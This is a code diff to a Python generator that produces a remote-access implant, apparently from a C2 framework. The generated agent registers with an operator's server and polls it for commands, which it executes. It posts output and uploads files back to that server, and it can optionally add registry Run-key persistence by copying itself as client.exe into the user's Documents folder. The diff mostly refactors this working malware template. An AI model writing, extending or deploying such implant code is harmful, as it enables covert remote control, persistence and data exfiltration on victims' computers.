@@ -161,9 +161,8 @@ if __name__ == "__main__":
 """
 
 def http_agent_template(lhost, lport, persistence, userAgent, sleepTimer):
-    # Define the persistence code as a function if persistence is True, otherwise an empty string
-    persistence_code = """
-def ensure_persistence():
+    if persistence==True:
+        val1=f'''def ensure_persistence():
     try:
         documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
         destination_executable = os.path.join(documents_dir, "client.exe")
@@ -173,13 +172,11 @@ def ensure_persistence():
             wreg.SetValueEx(key, "MyApp", 0, wreg.REG_SZ, destination_executable)
             wreg.CloseKey(key)
     except Exception as e:
-        print(f"Error ensuring persistence: {{e}}")
-""" if persistence==True else ""
-
-    # Include the call to ensure_persistence in the main function only if persistence is True
-    call_persistence_code = "    ensure_persistence()\n" if persistence==True else ""
-
-    # Correctly handle braces within f-string by doubling them for actual braces in the output
+        print(f"Error ensuring persistence: {{e}}")'''
+        val2="ensure_persistence()"
+    else:
+        val1=""
+        val2=""
     template = f"""import requests
 import subprocess
 import time
@@ -205,7 +202,14 @@ REGISTER_ENDPOINT = f'{{SERVER_URL}}/register'
 COMMAND_ENDPOINT = f'{{SERVER_URL}}/get_command'
 OUTPUT_ENDPOINT = f'{{SERVER_URL}}/send_output'
 
-{persistence_code}
+global current_working_directory
+current_working_directory = os.getcwd()
+
+current_executable = sys.executable
+documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
+destination_executable = os.path.join(documents_dir, "client.exe")
+
+{val1}
 
 def execute_command(command):
     global current_working_directory
@@ -242,9 +246,9 @@ def upload_file_to_server(filename):
     try:
         if os.path.exists(file_path):
             with open(file_path, 'rb') as f:
-                files = {'file': (filename, f)}
-            response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, headers=headers, allow_redirects=True)
-                #response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+                files = {{'file': (filename, f)}}
+                response = requests.post(OUTPUT_ENDPOINT, files=files, data={{'agent_id': AGENT_ID}}, headers=headers, allow_redirects=True)
+                #response = requests.post(OUTPUT_ENDPOINT, files=files, data={{'agent_id': AGENT_ID}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
             if response.status_code == 200:
                 return "File Downloaded successfully."
             else:
@@ -272,8 +276,8 @@ def download_file_from_server(filename):
 
 def send_output(output):
     try:
-        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, headers=headers, allow_redirects=True)
-        #response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+        response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output}}, headers=headers, allow_redirects=True)
+        #response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
         print("Response Status:", response.status_code)
         print("Response Text:", response.text)
         if response.ok:
@@ -286,26 +290,26 @@ def send_output(output):
 def register_agent():
     while True:
         try:
-            response = requests.post(REGISTER_ENDPOINT, data={'agent_id': AGENT_ID}, headers=headers, allow_redirects=True)
+            response = requests.post(REGISTER_ENDPOINT, data={{'agent_id': AGENT_ID}}, headers=headers, allow_redirects=True)
             if response.ok:
                 print("Agent registered successfully")
                 break  # Break the loop if registration is successful
             else:
                 print("Failed to register agent. Retrying...")
-                time.sleep(random.randint(5, 10))  # Random sleep between retries
+                time.sleep({sleepTimer})  # Random sleep between retries
         except requests.exceptions.ConnectionError:
             print("Unable to connect to the server. Retrying in a few seconds...")
-            time.sleep(random.randint(5, 10))
+            time.sleep({sleepTimer})
         except requests.exceptions.RequestException as e:
             print(f"Network error: {{e}}")
-            time.sleep(random.randint(5, 10))
+            time.sleep({sleepTimer})
 
 def main():
-    {call_persistence_code}    
+    {val2}
     register_agent()
     while True:
         try:
-            response = requests.get(COMMAND_ENDPOINT, params={'agent_id': AGENT_ID}, allow_redirects=True)
+            response = requests.get(COMMAND_ENDPOINT, params={{'agent_id': AGENT_ID}}, allow_redirects=True)
             if response.status_code == 200:
                 command_to_execute = response.json().get('command', '')
                 if command_to_execute:
